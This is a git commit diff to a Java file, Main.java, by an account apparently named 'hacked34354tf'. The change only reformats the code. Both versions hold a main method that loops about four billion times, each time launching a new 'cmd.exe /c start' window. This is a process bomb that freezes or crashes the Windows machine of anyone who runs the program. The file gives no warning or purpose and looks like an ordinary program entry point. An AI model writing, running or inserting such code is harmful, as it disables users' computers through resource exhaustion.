61e173c3ef60ba51558eb72f5665c4a3d8730f4a
hacked34354tf <104179839+hacked34354tf@users.noreply.github.com>
2022-08-15 17:32:22 +0300

    Update Main.java

--- Main.java
+++ Main.java
@@ -1,13 +1,11 @@
 public class Main { //Start
 
-
- public static void main(String[] args) throws IOException {
-		for (int x = Integer.MIN_VALUE; x < Integer.MAX_VALUE; x++) {
-			Runtime rt = Runtime.getRuntime();
-	    rt.exec(new String[]{"cmd.exe","/c","start"});
-		}
+public static void main(String[] args) throws IOException {
+	for (int x = Integer.MIN_VALUE; x < Integer.MAX_VALUE; x++) {
+		Runtime rt = Runtime.getRuntime();
+	       rt.exec(new String[]{"cmd.exe","/c","start"});
 	}
-
+}
 
 
 } //End
